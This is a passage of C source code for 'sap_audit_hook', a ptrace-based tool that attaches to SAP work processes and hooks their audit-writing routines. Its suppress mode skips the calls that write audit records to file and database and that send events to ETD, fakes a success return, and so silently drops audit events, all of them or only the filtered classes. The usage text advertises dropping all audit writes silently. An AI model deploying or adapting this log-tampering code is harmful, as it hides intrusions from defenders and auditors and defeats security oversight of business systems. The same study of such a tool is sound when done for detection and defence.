        for (int j = 0; j < cols; j++) {
            if (i+j < lim) printf("%02x ", buf[i+j]); else printf("   ");
        }
        printf(" |");
        for (int j = 0; j < cols && i+j < lim; j++)
            putchar(isprint(buf[i+j]) ? buf[i+j] : '.');
        printf("|\n");
    }
    if (len > 128) printf("    ... (%zu bytes total)\n", len);
}

/* SAP audit record structured decoder.
 *
 * Body layout (disk record; fwrite buffer prepends 64-byte hash):
 *   [0..3]   "0035"  - constant header
 *   [4..6]   class   - event class (AU.., DU.., EU..)
 *   [7..20]  ts      - YYYYMMDDHHMMSS
 *   [21..23] inst    - SAP instance number
 *   [24..27] wp_id   - OS PID mod 10000
 *   [28..32] seq     - sequence counter
 *   [33..34] step    - step type (Dd=dialog, B1=background, Da=async)
 *   [35..38] hdr2    - flags + client number (last 3 bytes = client)
 *   [39..]   fields  - length-prefixed variable fields:
 *                        8-digit prefix: user name, program/report name
 *                        4-digit prefix: src host/IP, dst host/IP, RFC info
 */
static void decode_sap_record(const uint8_t *raw, size_t rawlen)
{
    /* fwrite buffers start with a 64-byte uppercase-hex signature; skip it */
    size_t skip = 0;
    if (rawlen >= 68) {
        int all_uphex = 1;
        for (int i = 0; i < 64 && all_uphex; i++) {
            uint8_t c = raw[i];
            if (!((c>='0'&&c<='9') || (c>='A'&&c<='F'))) all_uphex = 0;
        }
        if (all_uphex) skip = 64;
    }
    const uint8_t *b = raw + skip;
    size_t blen = rawlen - skip;
    if (blen < 39) return;

    /* Timestamp */
    printf("  time   : %.4s-%.2s-%.2s %.2s:%.2s:%.2s\n",
           b+7, b+11, b+13, b+15, b+17, b+19);

    /* Step type + client */
    char step[3] = {b[33], b[34], 0};
    /* client digits are stored reversed (units-first): b[38]=hundreds, b[36]=units */
    char client[4] = {b[38], b[37], b[36], 0};
    const char *step_desc =
        (b[33]=='D' && b[34]=='d') ? "dialog" :
        (b[33]=='D' && b[34]=='a') ? "dialog-async" :
        (b[33]=='B')               ? "background" :
        (b[33]=='U')               ? "update" : "?";
    printf("  step   : %s (%s)   client: %s\n", step, step_desc, client);

    /* Variable-length fields from offset 39 */
    static const char *labels[] = {
        "user   ", "program", "src    ", "dst    ",
        "msg    ", "msg2   ", "msg3   ", NULL
    };
    size_t i = 39;
    int fidx = 0;
    while (i < blen && fidx < 7) {
        int found = 0;
        /* try 8-digit prefix first (user/program), then 4-digit (host/msg) */
        for (int plen = 8; plen >= 4; plen -= 4) {
            if (i + (size_t)plen >= blen) continue;
            int all_dig = 1;
            for (int j = 0; j < plen && all_dig; j++)
                if (!isdigit(b[i+j])) all_dig = 0;
            if (!all_dig) continue;
            unsigned long slen = 0;
            for (int j = 0; j < plen; j++) slen = slen*10 + (b[i+j]-'0');
            if (slen == 0 || slen > 300) continue;
            if (i + (size_t)plen + slen > blen) continue;
            int printable = 1;
            for (size_t j = 0; j < slen && printable; j++)
                if (b[i+plen+j] < 0x20 || b[i+plen+j] > 0x7e) printable = 0;
            if (!printable) continue;
            const char *lbl = labels[fidx] ? labels[fidx] : "fld    ";
            printf("  %s: %.*s\n", lbl, (int)slen, b+i+plen);
            i += (size_t)plen + slen;
            fidx++;
            found = 1;
            break;
        }
        if (!found) i++;
    }
}

/* Main record display function */
static void print_record(pid_t pid, const char *source,
                         const uint8_t *buf, size_t len,
                         int suppressed)
{
    char evclass[8] = {0};
    detect_event_class(buf, len, evclass);

    printf("[%s] pid=%-6d  class=%-4s  size=%4zu%s\n",
           source, pid, evclass, len,
           suppressed ? "  [SUPPRESSED]" : "");
    decode_sap_record(buf, len);
    fflush(stdout);
}

/* ─── Read UTF-16 string from remote process ─────────────────────────────── */
static void read_utf16_str(pid_t pid, uintptr_t ptr, char *out, size_t outsz)
{
    out[0] = 0;
    if (!ptr) return;
    uint16_t wbuf[256];
    if (mem_read(pid, ptr, wbuf, sizeof(wbuf)) < 0) return;
    size_t pos = 0;
    for (size_t i = 0; i < 256 && pos+1 < outsz; i++) {
        if (wbuf[i] == 0) break;
        if (wbuf[i] < 0x80) out[pos++] = (char)wbuf[i];
        else { out[pos++] = '?'; }
    }
    out[pos] = 0;
}

/* ─── Handle fwrite breakpoint ───────────────────────────────────────────────
 *
 * At the call site, AMD64 ABI calling convention:
 *   rdi = const void *ptr  (buffer)
 *   rsi = size_t   size    (element size, typically record size)
 *   rdx = size_t   nmemb   (count, always 1)
 *   rcx = FILE*    stream
 *
 * For suppress: skip the call (RIP = call_addr+5, RAX = nmemb).
 * For monitor:  single-step through the call, then re-plant INT3.
 */
static void handle_fwrite_trap(TracedPid *tp, int bp_idx,
                                struct user_regs_struct *regs)
{
    uintptr_t buf_ptr  = (uintptr_t)regs->rdi;
    size_t    rec_size = (size_t)regs->rsi;
    size_t    nmemb    = (size_t)regs->rdx;

    if (rec_size == 0 || rec_size > MAX_REC) {
        info("[warn] pid=%d fwrite size %zu out of range\n", tp->pid, rec_size);
        return;
    }

    uint8_t *rbuf = malloc(rec_size * nmemb);
    if (!rbuf) return;
    if (mem_read(tp->pid, buf_ptr, rbuf, rec_size * nmemb) < 0) {
        free(rbuf); return;
    }

    char evclass[8] = {0};
    detect_event_class(rbuf, rec_size * nmemb, evclass);
    int matches = class_matches_filter(evclass);
    int do_suppress = g_suppress && matches;

    const char *src = (bp_idx == HOOK_FWRITE_HEADER) ? "fwrite:hdr" : "fwrite:entry";
    print_record(tp->pid, src, rbuf, rec_size * nmemb, do_suppress);
    free(rbuf);

    if (do_suppress) {
        /* Skip the call: set RIP = bp_addr+5, RAX = nmemb (success) */
        regs->rip = tp->bps[bp_idx].addr + 5;
        regs->rax = nmemb;
        ptrace(PTRACE_SETREGS, tp->pid, NULL, regs);
        /* Re-plant INT3 immediately, then CONT */
        plant_bp(tp, bp_idx);
        ptrace(PTRACE_CONT, tp->pid, NULL, NULL);
    } else {
        /* Let the call execute: single-step the call instruction */
        tp->stepping = 1;
        tp->step_bp  = bp_idx;
        ptrace(PTRACE_SINGLESTEP, tp->pid, NULL, NULL);
    }
}

/* ─── Handle write_event_to_DB breakpoint ────────────────────────────────────
 *
 * Prototype: write_event_to_DB(client*, user*, u32, u32, str*, rsauentr*,
 *                               str*, str*, u32)
 *   rdi = client (char16_t*)
 *   rsi = user   (char16_t*)
 *   rdx = event type / class_id_1
 *   rcx = event class_id_2
 *   r8  = extra string (char16_t*)
 *   r9  = rsauentr* (audit record struct; read first 256 bytes as blob)
 */
static void handle_writedb_trap(TracedPid *tp, int bp_idx,
                                 struct user_regs_struct *regs)
{
    char client[64]  = {0};
    char user[64]    = {0};
    char extra[256]  = {0};

    read_utf16_str(tp->pid, (uintptr_t)regs->rdi, client, sizeof(client));
    read_utf16_str(tp->pid, (uintptr_t)regs->rsi, user,   sizeof(user));
    read_utf16_str(tp->pid, (uintptr_t)regs->r8,  extra,  sizeof(extra));

    /* read rsauentr blob from r9 */
    uint8_t rec[256] = {0};
    if (regs->r9) mem_read(tp->pid, (uintptr_t)regs->r9, rec, sizeof(rec));

    char evclass[8] = {0};
    detect_event_class(rec, sizeof(rec), evclass);
    /* also check args directly */
    if (evclass[0] == '?') {
        /* event class may be encoded in rdx/rcx as packed ASCII */
        uint32_t ec1 = (uint32_t)regs->rdx;
        if (ec1 && (ec1 & 0xff) >= 0x41 && (ec1 & 0xff) <= 0x5a) {
            snprintf(evclass, sizeof(evclass), "%c%c%c",
                     (char)(ec1 & 0xff),
                     (char)((ec1 >> 8) & 0xff),
                     (char)((ec1 >> 16) & 0xff));
        }
    }

    int matches     = class_matches_filter(evclass);
    int do_suppress = g_suppress && matches;

    printf("[write_db  ] pid=%-6d  src=write_db      class=%-5s%s\n",
           tp->pid, evclass, do_suppress ? "  [SUPPRESSED]" : "");
    if (client[0]) printf("  client: %s\n", client);
    if (user[0])   printf("  user:   %s\n", user);
    if (extra[0])  printf("  extra:  %s\n", extra);
    if (rec[0])    hexdump(rec, 64, 16);
    fflush(stdout);

    if (do_suppress) {
        regs->rip = tp->bps[bp_idx].addr + 5;
        regs->rax = 0;
        ptrace(PTRACE_SETREGS, tp->pid, NULL, regs);
        plant_bp(tp, bp_idx);
        ptrace(PTRACE_CONT, tp->pid, NULL, NULL);
    } else {
        tp->stepping = 1;
        tp->step_bp  = bp_idx;
        ptrace(PTRACE_SINGLESTEP, tp->pid, NULL, NULL);
    }
}

/* ─── Handle ETD breakpoints ─────────────────────────────────────────────────
 *
 * Three ETD hook sites inside rsauwr1ex:
 *
 *  HOOK_ETD_ACTIVE_1 / _2 — EtdSenderIsActive()
 *    No args. Returns char (bool): 1 = ETD active, 0 = inactive.
 *    Suppress: return 0 → rsauwr1ex skips the entire ETD branch.
 *    This is the most efficient ETD suppression — EtdSetEvent and
 *    EtdSendEvent are never reached.
 *
 *  HOOK_ETD_SEND — EtdSendEvent(etd_handle*)
 *    rdi = ETD event handle (opaque pointer).
 *    Suppress: return 0 (success) → event is silently discarded.
 *    Defence-in-depth if EtdSenderIsActive returns non-zero despite hook.
 *
 * In monitor mode all three hooks log a notification and single-step through.
 */
static void handle_etd_trap(TracedPid *tp, int bp_idx,
                             struct user_regs_struct *regs)
{
    int do_suppress = g_suppress;   /* ETD events carry no event-class arg   */
                                    /* at this call site; filter is bypassed  */
                                    /* (whole-event suppress only)            */
    const char *label = HOOK_DEFS[bp_idx].label;

    if (bp_idx == HOOK_ETD_ACTIVE_1 || bp_idx == HOOK_ETD_ACTIVE_2) {
        if (g_verbose) {
            printf("[%-14s] pid=%-6d  ETD active-check intercepted%s\n",
                   label, tp->pid, do_suppress ? "  [returning 0 = inactive]" : "");
            fflush(stdout);
        }

        if (do_suppress) {
            /* Skip the call; return 0 (false = ETD not active) */
            regs->rip = tp->bps[bp_idx].addr + 5;
            regs->rax = 0;
            ptrace(PTRACE_SETREGS, tp->pid, NULL, regs);
            plant_bp(tp, bp_idx);
            ptrace(PTRACE_CONT, tp->pid, NULL, NULL);
            return;
        }

    } else { /* HOOK_ETD_SEND — PoC/unverified: suppress path not tested live */
        printf("[%-14s] pid=%-6d  EtdSendEvent intercepted%s\n",
               label, tp->pid, do_suppress ? "  [SUPPRESSED – PoC/unverified]" : "");
        fflush(stdout);

        if (do_suppress) {
            /* Skip the call; return 0 (success — no error path triggered).
             * NOTE: not verified on a live system with active ETD path. */
            regs->rip = tp->bps[bp_idx].addr + 5;
            regs->rax = 0;
            ptrace(PTRACE_SETREGS, tp->pid, NULL, regs);
            plant_bp(tp, bp_idx);
            ptrace(PTRACE_CONT, tp->pid, NULL, NULL);
            return;
        }
    }

    /* Monitor mode: single-step through the call */
    tp->stepping = 1;
    tp->step_bp  = bp_idx;
    ptrace(PTRACE_SINGLESTEP, tp->pid, NULL, NULL);
}

/* ─── Main ptrace event handler ──────────────────────────────────────────────*/
static void handle_waitpid_event(pid_t pid, int status)
{
    TracedPid *tp = find_proc(pid);
    if (!tp) return;

    if (WIFEXITED(status) || WIFSIGNALED(status)) {
        info("[info] pid %d exited\n", pid);
        tp->pid = 0;
        return;
    }
    if (!WIFSTOPPED(status)) return;

    int sig = WSTOPSIG(status);

    if (tp->stepping && sig == SIGTRAP) {
        /* Single-step completed: re-plant the breakpoint and continue */
        int idx = tp->step_bp;
        tp->stepping = 0;
        tp->step_bp  = -1;
        plant_bp(tp, idx);
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        return;
    }

    if (sig == SIGTRAP) {
        struct user_regs_struct regs;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
            ptrace(PTRACE_CONT, pid, NULL, NULL);
            return;
        }

        /* RIP points one past the INT3 byte */
        uintptr_t trap_addr = (uintptr_t)regs.rip - 1;

        /* Find which breakpoint fired */
        int matched = -1;
        for (int i = 0; i < HOOK_MAX; i++) {
            if (tp->bps[i].planted && tp->bps[i].addr == trap_addr) {
                matched = i;
                break;
            }
        }

        if (matched < 0) {
            /* Not our INT3 – deliver as-is */
            ptrace(PTRACE_CONT, pid, NULL, (void*)(intptr_t)SIGTRAP);
            return;
        }

        /* Restore the original byte and rewind RIP */
        restore_bp(tp, matched);
        regs.rip = trap_addr;
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        /* re-read regs after setregs */
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);

        if (matched == HOOK_WRITE_DB)
            handle_writedb_trap(tp, matched, &regs);
        else if (matched == HOOK_ETD_ACTIVE_1 ||
                 matched == HOOK_ETD_ACTIVE_2 ||
                 matched == HOOK_ETD_SEND)
            handle_etd_trap(tp, matched, &regs);
        else
            handle_fwrite_trap(tp, matched, &regs);

        return;
    }

    /* Other signal: pass through */
    ptrace(PTRACE_CONT, pid, NULL, (void*)(intptr_t)sig);
}

/* ─── Attach to a work process and set breakpoints ──────────────────────────*/
static int attach_process(pid_t pid)
{
    if (g_nprocs >= MAX_PIDS) { fprintf(stderr,"[warn] MAX_PIDS reached\n"); return -1; }

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        fprintf(stderr,"[warn] PTRACE_ATTACH pid %d: %s\n", pid, strerror(errno));
        return -1;
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) { ptrace(PTRACE_DETACH, pid, NULL, NULL); return -1; }

    uintptr_t base = resolve_base(pid);
    if (!base) {
        fprintf(stderr,"[warn] could not resolve base for pid %d\n", pid);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Identify work process type via whoami global */
    int32_t whoami = -1;
    if (!is_work_process(pid, base, &whoami)) {
        if (g_verbose)
            fprintf(stderr,"[skip] pid %d type=%s (%d) — not an audit-writing work process\n",
                    pid, work_type_name(whoami), whoami);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    TracedPid *tp = &g_procs[g_nprocs];
    memset(tp, 0, sizeof(*tp));
    tp->pid  = pid;
    tp->base = base;
    tp->step_bp = -1;

    /* Resolve all hook addresses by scanning the live rsauwr1ex body for
     * `call rel32` (0xE8) targeting each known callee.  Fully build-
     * independent: no hardcoded intra-function offsets.  Falls back to
     * base + NM_* if ELF lookup or scan fails. */
    uintptr_t rsauwr1ex_off = 0,      rsauwr1ex_size = 0;
    uintptr_t rsauwr1ex_cold_off = 0, rsauwr1ex_cold_size = 0;
    uintptr_t fwrite_entry_addr = 0,  fwrite_header_addr = 0;
    uintptr_t write_db_addr     = 0;
    uintptr_t etd_active1_addr  = 0,  etd_active2_addr = 0;
    uintptr_t etd_send_addr     = 0;

    char exepath[256];
    if (get_exe_path(pid, exepath, sizeof(exepath)) == 0) {
        find_elf_symbol(exepath, "rsauwr1ex",      &rsauwr1ex_off,      &rsauwr1ex_size);
        find_elf_symbol(exepath, "rsauwr1ex.cold", &rsauwr1ex_cold_off, &rsauwr1ex_cold_size);

        uintptr_t fwrite_plt_off = find_plt_entry(exepath, "fwrite");
        uintptr_t write_db_off   = find_elf_symbol_prefix_offset(exepath, SYM_WRITE_DB_PFX);
        uintptr_t etd_active_off = find_elf_symbol_offset(exepath, "EtdSenderIsActive");
        uintptr_t etdsend_off    = find_elf_symbol_offset(exepath, "EtdSendEvent");

        /* Scan rsauwr1ex hot body for calls to each callee */
        if (rsauwr1ex_off) {
            size_t scan_len = rsauwr1ex_size ? rsauwr1ex_size : 0x8000;
            if (scan_len > 0x20000) scan_len = 0x20000;
            uint8_t *buf = malloc(scan_len);
            uintptr_t fn_addr = base + rsauwr1ex_off;
            if (buf && mem_read(pid, fn_addr, buf, scan_len) == 0) {
                int fwrite_cnt = 0, active_cnt = 0;
                for (size_t k = 0; k + 5 <= scan_len; k++) {
                    if (buf[k] != 0xe8) continue;
                    int32_t disp;
                    memcpy(&disp, &buf[k+1], 4);
                    uintptr_t target = fn_addr + k + 5 + (intptr_t)disp;
                    if (fwrite_plt_off && target == base + fwrite_plt_off) {
                        if (++fwrite_cnt == 1) fwrite_entry_addr  = fn_addr + k;
                        else if (fwrite_cnt == 2) fwrite_header_addr = fn_addr + k;
                    } else if (write_db_off && target == base + write_db_off && !write_db_addr) {
                        write_db_addr = fn_addr + k;
                    } else if (etd_active_off && target == base + etd_active_off) {
                        if (++active_cnt == 1) etd_active1_addr = fn_addr + k;
                        else if (active_cnt == 2) etd_active2_addr = fn_addr + k;
                    }
                }
            }
            free(buf);
        }

        /* Scan rsauwr1ex.cold for the call to EtdSendEvent */
        if (rsauwr1ex_cold_off && etdsend_off) {
            uintptr_t etdsend_addr = base + etdsend_off;
            size_t scan_len = rsauwr1ex_cold_size ? rsauwr1ex_cold_size : 0x1000;
            if (scan_len > 0x4000) scan_len = 0x4000;
            uint8_t *buf = malloc(scan_len);
            uintptr_t cold_addr = base + rsauwr1ex_cold_off;
            if (buf && mem_read(pid, cold_addr, buf, scan_len) == 0) {
                for (size_t k = 0; k + 5 <= scan_len; k++) {
                    if (buf[k] != 0xe8) continue;
                    int32_t disp;
                    memcpy(&disp, &buf[k+1], 4);
                    uintptr_t target = cold_addr + k + 5 + (intptr_t)disp;
                    if (target == etdsend_addr) { etd_send_addr = cold_addr + k; break; }
                }
            }
            free(buf);
        }
    }

    /* Set up breakpoints — scan results override hardcoded NM fallbacks */
    for (int i = 0; i < HOOK_MAX; i++) {
        tp->bps[i].addr    = base + HOOK_DEFS[i].nm_off;
        tp->bps[i].planted = 0;
    }
    if (fwrite_entry_addr)  tp->bps[HOOK_FWRITE_ENTRY].addr  = fwrite_entry_addr;
    if (fwrite_header_addr) tp->bps[HOOK_FWRITE_HEADER].addr = fwrite_header_addr;
    if (write_db_addr)      tp->bps[HOOK_WRITE_DB].addr      = write_db_addr;
    if (etd_active1_addr)   tp->bps[HOOK_ETD_ACTIVE_1].addr  = etd_active1_addr;
    if (etd_active2_addr)   tp->bps[HOOK_ETD_ACTIVE_2].addr  = etd_active2_addr;
    if (etd_send_addr)      tp->bps[HOOK_ETD_SEND].addr      = etd_send_addr;

    for (int i = 0; i < HOOK_MAX; i++) {
        if (plant_bp(tp, i) < 0) {
            static int warned[HOOK_MAX];
            if (!warned[i] && g_verbose) {
                warned[i] = 1;
                fprintf(stderr,"[warn] pid %d: failed to plant %s\n",
                        pid, HOOK_DEFS[i].label);
            }
        }
    }

    /* Try to discover audit log file path (needed for inotify) */
    if (g_audit_path[0] == 0)
        find_audit_file(pid, base);

    info("[+] attached pid %-6d  type=%-3s  base=0x%lx\n"
         "      file:  entry@0x%lx  header@0x%lx\n"
         "      db:    write_db@0x%lx\n"
         "      etd:   active1@0x%lx  active2@0x%lx  send@0x%lx\n",
         pid, work_type_name(whoami), base,
         tp->bps[HOOK_FWRITE_ENTRY].addr,
         tp->bps[HOOK_FWRITE_HEADER].addr,
         tp->bps[HOOK_WRITE_DB].addr,
         tp->bps[HOOK_ETD_ACTIVE_1].addr,
         tp->bps[HOOK_ETD_ACTIVE_2].addr,
         tp->bps[HOOK_ETD_SEND].addr);

    g_nprocs++;
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    return 0;
}

/* ─── Detach all processes ───────────────────────────────────────────────────*/
static void detach_all(void)
{
    for (int i = 0; i < g_nprocs; i++) {
        if (!g_procs[i].pid) continue;
        pid_t pid = g_procs[i].pid;
        /* stop first */
        kill(pid, SIGSTOP);
        waitpid(pid, NULL, 0);
        /* restore all breakpoints */
        for (int j = 0; j < HOOK_MAX; j++)
            restore_bp(&g_procs[i], j);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        info("[-] detached pid %d\n", pid);
    }
}

/* ─── inotify handler – passive read from disk ───────────────────────────────*/
static void handle_inotify_event(void)
{
    if (!g_audit_path[0]) return;
    FILE *f = fopen(g_audit_path, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long end = ftell(f);
    if (end <= g_inotify_pos) { fclose(f); return; }

    fseek(f, g_inotify_pos, SEEK_SET);
    size_t newbytes = (size_t)(end - g_inotify_pos);
    uint8_t *buf = malloc(newbytes);
    if (!buf) { fclose(f); return; }
    size_t nr = fread(buf, 1, newbytes, f);
    fclose(f);
    g_inotify_pos = end;

    if (nr == 0) { free(buf); return; }

    if (g_verbose)
        printf("[inotify   ] +%zu bytes appended to %s\n", nr, g_audit_path);
    print_record(0, "disk", buf, nr, 0);
    free(buf);
}

static void drain_inotify(void)
{
    if (g_inotify_fd < 0) return;
    char ibuf[INO_BUFSZ];
    ssize_t r = read(g_inotify_fd, ibuf, sizeof(ibuf));
    if (r <= 0) return;
    const char *p = ibuf, *end = ibuf + r;
    while (p + sizeof(struct inotify_event) <= end) {
        const struct inotify_event *ev = (const struct inotify_event*)p;
        if (ev->mask & (IN_MODIFY | IN_CLOSE_WRITE))
            handle_inotify_event();
        p += sizeof(struct inotify_event) + ev->len;
    }
}

/* ─── Main ───────────────────────────────────────────────────────────────────*/
static void usage(const char *argv0)
{
    fprintf(stderr,
        "Usage: %s [options]\n"
        "  --pid <PID>       target specific disp+work PID\n"
        "  --monitor         read-only mode: observe all sinks via ptrace + inotify\n"
        "  --suppress        drop matching audit writes across all sinks\n"
        "  --filter CLASS    only act on these event classes, comma-separated (e.g. EUP or AUW,AU3)\n"
        "  --audit-file PATH override audit log file path for inotify\n"
        "  -v / --verbose    show intercepted events and diagnostic output\n"
        "  -d / --debug      alias for --verbose\n"
        "\nExamples:\n"
        "  %s --suppress               # drop ALL audit writes (silent)\n"
        "  %s --suppress --filter EUP  # drop only EUP events (silent)\n"
        "  %s --monitor -v             # observe all audit events with output\n"
        "  %s --suppress -v            # drop + log what was dropped\n",
        argv0, argv0, argv0, argv0, argv0);
    exit(1);
}

int main(int argc, char **argv)
{
    pid_t force_pid = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i],"--pid") && i+1 < argc)
            force_pid = atoi(argv[++i]);
        else if (!strcmp(argv[i],"--monitor"))
            g_mode_monitor = 1;
        else if (!strcmp(argv[i],"--suppress"))
            g_suppress = 1;
        else if (!strcmp(argv[i],"--filter") && i+1 < argc)
            snprintf(g_filter, sizeof(g_filter), "%s", argv[++i]);
        else if (!strcmp(argv[i],"--audit-file") && i+1 < argc)
            snprintf(g_audit_path, sizeof(g_audit_path), "%s", argv[++i]);
        else if (!strcmp(argv[i],"-v") || !strcmp(argv[i],"--verbose") ||
                 !strcmp(argv[i],"-d") || !strcmp(argv[i],"--debug"))
            g_verbose = 1;
        else if (!strcmp(argv[i],"--help") || !strcmp(argv[i],"-h"))
            usage(argv[0]);
        else { fprintf(stderr,"Unknown option: %s\n",argv[i]); usage(argv[0]); }
    }

    /* --monitor forces read-only regardless of other flags */
    if (g_mode_monitor)
        g_suppress = 0;

    signal(SIGINT,  sig_handler);
    signal(SIGTERM, sig_handler);

    info("=== sap_audit_hook ===  mode=%s  suppress=%s  filter=%s\n"
         "    hooks: file(fwrite x2) + db(write_event_to_DB) + etd(active x2 + send)\n",
         g_mode_monitor ? "monitor(read-only)" : "hook",
         g_suppress ? "yes" : "no",
         g_filter[0] ? g_filter : "(all)");

    /* ── ptrace attach (all modes) ── */
    {
        pid_t pids[MAX_PIDS];
        int n = find_pids(pids, MAX_PIDS, force_pid);
        if (n == 0) die("No disp+work processes found");

        for (int i = 0; i < n; i++)
            attach_process(pids[i]);

        if (g_nprocs == 0) die("Failed to attach to any work process");
    }

    /* ── Audit file discovery for inotify ──
     * attach_process() fills g_audit_path via h_rsau_file if possible;
     * fall back to a date-based scan of /usr/sap. */
    if (!g_audit_path[0]) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        char pattern[64];
        snprintf(pattern, sizeof(pattern), "audit_%04d%02d%02d",
                 tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday);

        DIR *d = opendir("/usr/sap");
        if (d) {
            struct dirent *de;
            while ((de = readdir(d))) {
                if (de->d_name[0] == '.') continue;
                char logdir[256];
                snprintf(logdir,sizeof(logdir),"/usr/sap/%s",de->d_name);
                const char *types[] = {"DVEBMGS","D","ASCS",NULL};
                for (int t2 = 0; types[t2]; t2++) {
                    DIR *d2 = opendir(logdir);
                    if (!d2) continue;
                    struct dirent *de2;
                    while ((de2 = readdir(d2))) {
                        if (strncmp(de2->d_name,types[t2],strlen(types[t2]))) continue;
                        char ldir[512];
                        snprintf(ldir,sizeof(ldir),"%s/%s/log",logdir,de2->d_name);
                        char candidate[600];
                        snprintf(candidate,sizeof(candidate),"%s/%s",ldir,pattern);
                        struct stat st;
                        if (stat(candidate,&st)==0) {
                            snprintf(g_audit_path,sizeof(g_audit_path),"%s",candidate);
                            break;
                        }
                    }
                    closedir(d2);
                    if (g_audit_path[0]) break;
                }
                if (g_audit_path[0]) break;
            }
            closedir(d);
        }
    }
    if (!g_audit_path[0] && g_verbose)
        fprintf(stderr,"[warn] could not find audit log file; use --audit-file\n");

    /* Set up inotify for passive disk view */
    if (g_audit_path[0])
        setup_inotify(g_audit_path);

    info("[*] monitoring started  (Ctrl-C to stop)\n");
    if (g_verbose) printf("─────────────────────────────────────────────────────────────────\n");

    /* ── main event loop ── */
    while (g_running) {
        /* Drain all pending ptrace events */
        int status;
        pid_t child;
        while ((child = waitpid(-1, &status, WNOHANG | __WALL)) > 0)
            handle_waitpid_event(child, status);

        /* Check inotify */
        if (g_inotify_fd >= 0) {
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(g_inotify_fd, &rfds);
            struct timeval tv = { 0, 20000 }; /* 20 ms */
            if (select(g_inotify_fd+1, &rfds, NULL, NULL, &tv) > 0)
                drain_inotify();
        } else {
            usleep(20000);
        }
    }

    /* Cleanup */
    if (g_verbose) printf("\n─────────────────────────────────────────────────────────────────\n");
    info("[*] shutting down\n");
    detach_all();
    if (g_inotify_fd >= 0) close(g_inotify_fd);
    return 0;
}
